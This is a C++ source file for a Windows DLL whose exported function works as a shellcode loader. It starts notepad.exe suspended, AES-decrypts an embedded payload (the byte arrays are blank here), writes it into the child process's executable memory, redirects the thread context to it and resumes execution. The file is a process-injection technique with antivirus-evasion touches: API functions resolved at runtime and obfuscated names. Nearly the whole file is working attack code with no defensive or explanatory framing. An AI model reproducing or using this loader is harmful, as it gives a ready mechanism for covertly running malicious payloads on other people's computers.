
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <math.h>
#include <windows.h>
#include <winsock2.h>
#include <stdio.h>
#include <ctime>
#include <ws2tcpip.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
#pragma comment(lib, "ntdll")


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void AESdecman1l(char* code1299d, DWORD code1299dLen, char* k27eykk, DWORD k27eykkLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)k27eykk, k27eykkLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)code1299d, &code1299dLen);
CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

extern "C" __declspec(dllexport) long coolboy()
{
    WinExec("calc.exe", SW_SHOW);
    CONTEXT da = {0};
    STARTUPINFO ci = {0};
    PROCESS_INFORMATION pei = {0};
    ci.cb = sizeof(ci);
    
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    BOOL (*pCreateProcess)(
        LPCSTR lpApplicationName,LPSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCSTR lpCurrentDirectory,LPSTARTUPINFOA lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    ) = (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
        GetProcAddress(hKernel32, "CreateProcessA");

    pCreateProcess("C:\\Windows\\system32\\notepad.exe", 0, 0, 0, FALSE,CREATE_SUSPENDED, 0, 0, &ci, &pei);
    
    LPVOID saplo;
    da.ContextFlags = CONTEXT_FULL;

    GetThreadContext(pei.hThread, &da);
unsigned char itsthecod345[] = {};
    
LPVOID (*pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
    (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
    
    saplo = pVirtualAllocEx(pei.hProcess, 0, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    unsigned char ke185hams[] = {}; 
    AESdecman1l((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));
    
    
BOOL (*pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
    (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(hKernel32, "WriteProcessMemory");

    pWriteProcessMemory(pei.hProcess, saplo, itsthecod345, sizeof(itsthecod345), 0);
    
    da.Rcx = (DWORD64)saplo; 
    
    SetThreadContext(pei.hThread, &da);

    ResumeThread(pei.hThread); 


    return TRUE;
}
